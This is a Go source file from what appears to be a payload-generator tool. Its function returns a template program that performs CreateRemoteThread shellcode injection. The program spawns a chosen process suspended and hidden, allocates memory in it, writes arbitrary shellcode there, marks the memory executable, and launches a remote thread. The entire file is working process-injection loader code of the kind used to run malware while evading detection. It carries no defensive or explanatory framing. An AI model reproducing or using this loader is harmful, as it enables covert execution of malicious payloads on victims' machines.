package loaders

import (
	"fmt"
)

func GetCRTTemplate(targetProcess string) string {
	return fmt.Sprintf(`
package main

import (
        "syscall"
        "unsafe"
)


const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_READWRITE            = 0x4
    PAGE_EXECUTE_READ         = 0x20
    PAGE_EXECUTE_READWRITE    = 0x40
    CREATE_SUSPENDED          = 0x4
    CREATE_NO_WINDOW          = 0x8000000
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")

    VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
    VirtualProtectEx    = kernel32.MustFindProc("VirtualProtectEx")
    WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
    CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
)


func loadProcess(target string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(target)

	if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	return &pi
}

func ExecuteOrderSixtySix(shellcode []byte) {

    /* spawn target process */
    process := loadProcess("%s")
    oldProtectCfg := PAGE_READWRITE

     /* allocating the appropriate amount of memory */
    baseAddr, _, _ := VirtualAllocEx.Call(
        uintptr(process.Process),
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )

    /* overwriting process memory with our shellcode */
    _, _, _ = WriteProcessMemory.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        0,
    )

    /* changing permissions for our memory segment */
    _, _, _ = VirtualProtectEx.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtectCfg)),
    )

    /* load remote thread */
    _, _, _ = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
    select {}
}
    `, targetProcess)
}
